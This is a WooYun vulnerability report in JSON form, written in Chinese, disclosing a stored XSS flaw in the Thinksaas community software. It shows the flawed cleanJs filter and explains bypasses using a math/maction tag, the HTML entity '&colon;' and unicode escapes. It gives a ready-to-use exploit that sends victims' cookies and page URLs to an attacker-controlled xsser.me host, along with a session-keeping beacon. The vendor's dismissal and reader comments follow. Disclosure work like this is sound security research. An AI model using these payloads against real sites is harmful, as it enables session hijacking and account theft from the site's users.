{"id": 58449, "wybug_id": "wooyun-2014-051206", "wybug_title": "Thinksaas存储型XSS", "wybug_corp": "thinksaas.cn", "wybug_author": "phith0n", "wybug_date": "2014-02-20 13:03", "wybug_open_date": "2014-05-18 13:03", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-22：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-18：\t细节向公众公开  简要描述： 点击触发，因为多处调用的同一个函数所以多处存在问题之前还交过一个它的sql注入一个越权。。求审核……审核……核 详细说明：  Thinksaas是一款轻量级开源社区系统，界面我很喜欢。官网在http://www.thinksaas.cn/。因为是一个类似论坛的社区，所以前台难免会有富文本编辑器，而处理不好富文本的话就容易产生XSS。自从看了M老师的文章，我对XSS也有了进一步的认识，所以才能找到Thinksaas过滤不严的XSS。我们先看它使用的哪个函数对XSS进行的过滤，\\thinksaas\\tsFunction.php中：\n/** * 过滤脚本代码 * @param unknown $text * @return mixed */function cleanJs($text) {\t$text = trim ( $text );\t$text = stripslashes ( $text );\t// 完全过滤注释\t$text = preg_replace ( '/<!--?.*-->/', '', $text );\t// 完全过滤动态代码\t$text = preg_replace ( '/<\\?|\\?>/', '', $text );\t// 完全过滤js\t$text = preg_replace ( '/<script?.*\\/script>/', '', $text );\t// 过滤多余html\t$text = preg_replace ( '/<\\/?(html|head|meta|link|base|body|title|style|script|form|iframe|frame|frameset)[^><]*>/i', '', $text );\t// 过滤on事件lang js\twhile ( preg_match ( '/(<[^><]+)(lang|data|onfinish|onmouse|onexit|onerror|onclick|onkey|onload|onchange|onfocus|onblur)[^><]+/i', $text, $mat ) ) {\t\t$text = str_replace ( $mat [0], $mat [1], $text );\t}\twhile ( preg_match ( '/(<[^><]+)(window\\.|javascript:|js:|about:|file:|document\\.|vbs:|cookie)([^><]*)/i', $text, $mat ) ) {\t\t$text = str_replace ( $mat [0], $mat [1] . $mat [3], $text );\t}\treturn $text;}/** * 输入安全过滤 * @param unknown $text * @return mixed */function tsClean($text) {\t$text = cleanJs ( $text );\treturn $text;}\ncms中多处调用tsClean来清理富文本，而tsClean是调用CleanJS来清理xss。于是我们看到cleanJS函数。首先过滤了注释，和php代码，然后“完全过滤JS”，但因为没有加i修饰符，所以直接大小写绕过。不过绕过此处也绕不过下面对标签名的过滤：html|head|meta|link|base|body|title|style|script|form|iframe|frame|frameset。过滤了这些标签，自然是还有很多标签可以执行。它对属性的过滤比较严格，基本上onmouse系列、onkey系列、各种on属性都没了。剩下一下不太好触发的，暂时不考虑。再下来对一些敏感的关键词进行了过滤，比如javascript:、cookie等。标签过滤的比较少，所以我们从标签入手，一看没有过滤math，我们就可以利用math标签来绕过过滤。现给出大概的POC（有些地方情况不同略有小修改）：<math><maction actiontype=\"\" xlink:href=\"javascript&colon;alert(\\u0064ocument.c\\u006fokie)\">hello world<maction></math>因为过滤了“javascript:”这个关键词，但符号我们可以替换成html实体，于是利用“javascript&colon;”绕过。而“document.”、“cookie”关键词我们可以通过unicode编码绕过，随便编码一个字符即可。   漏洞证明：  我们看看可以在哪里插入这个POC，随便找一个富文本编辑框，比如新建小组那里，有个小组介绍：\n\n在这里插入即可（为防止编辑器本地过滤，抓包修改最佳）。插入完成后，其他用户在查看该小组信息时就能看到此处XSS：\n\n点击触发：\n\n当然还有其他很多地方，比如小组发帖处。不过发帖处由于对于\\的过滤，所以我们unicode编码要写成\\\\u0064。这次来个可以xss打cookie的EXP：\n<p><math><maction actiontype=\"\" xlink:href=\"javascript&colon;(function(){(new Image()).src='http://你的xsser.me地址/index.php?do=api&id=seGRev&location='+escape((function(){try{return \\\\u0064ocument.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&co\\\\u006fkie='+escape((function(){try{return \\\\u0064ocument.co\\\\u006fkie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (wind\\\\u006fw.opener && wind\\\\u006fw.opener.location.href)?wind\\\\u006fw.opener.location.href:''}catch(e){return ''}})());})(); if(''==1){keep=new Image();keep.src='http://你的xsser.me地址/index.php?do=keepsession&id=seGRev&url='+escape(\\\\u0064ocument.location)+'&c\\\\u006fokie='+escape(\\\\u0064ocument.co\\\\u006fkie)};\">hello world</maction></math></p>\n基本上可以执行任意代码，只要注意在javascript中避免出现关键字（用unicode替代）即可。可收信成功：\n\n   修复方案：  使用白名单过滤富文本，可以考虑使用UBB   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-05-18 13:03 厂商回复： 暂时采用ubb编辑器不太现实，还是需要富文本编辑器，慢慢过滤吧。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-22 14:22 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  那也不至于忽略啊……    \n     2015-02-08 16:30 |    \t\t你又不是她 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | ~。~)\t\t \n  跟一下    \n     2015-04-30 22:55 |    \t\tBaD \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:5        | 菜鸟一枚，多多指教)\t\t \n  大牛，M老师都有哪些文章啊，求推荐哈。给个链接，想看看xss    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}